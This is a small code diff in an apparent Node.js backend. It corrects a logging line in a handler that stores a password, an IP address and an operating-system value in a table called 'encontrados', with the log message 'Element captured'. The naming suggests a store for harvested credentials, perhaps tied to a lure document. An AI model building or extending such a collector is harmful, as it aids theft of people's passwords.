@@ -7,7 +7,7 @@ const DataInserted = async (req,res) => {
     const sqlQuery = `insert into encontrados(password,ip,SO) values ($1,$2,$3) RETURNING *`;
     const values = [password, ip, SO];
     const response = await poolPDF.query(sqlQuery,values);
-    console.log("Element captured: \n",res.rows);
+    console.log("Element captured: \n",response.rows);
     res.json(1);
     //console.log(response.rows[0].ip);
 };
